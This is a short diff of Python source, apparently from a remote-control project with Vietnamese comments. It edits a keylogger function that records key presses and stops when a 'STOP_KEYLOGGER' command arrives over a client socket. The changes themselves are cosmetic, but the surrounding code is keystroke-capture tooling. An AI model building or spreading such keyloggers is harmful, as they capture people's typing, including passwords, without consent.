@@ -23,7 +23,7 @@ def start_keylogger(client_socket):
         if key == keyboard.Key.enter:
             print(f'\rPhim nhan: {keys_pressed}')  # In ra trên cùng một dòng
             keys_pressed = ""  # Reset sau khi nhấn Enter
-            print(end='')  # Đưa con trỏ về đầu dòng để tiếp tục nhập
+            print("", end='')  # Đưa con trỏ về đầu dòng để tiếp tục nhập
         else:
             keys_pressed += key_str  # Cập nhật chuỗi ký tự đã nhấn
             
@@ -44,8 +44,7 @@ def start_keylogger(client_socket):
     def listen_for_commands():
         nonlocal stop_keylogger
         try:
-            command = receive_response_utf8(client_socket)
-            
+            command = receive_response_utf8(client_socket)            
             if command == "STOP_KEYLOGGER":                    
                 print("\nClient yeu cau tat Keylogger")
                 stop_keylogger = True  # Đánh dấu dừng keylogger
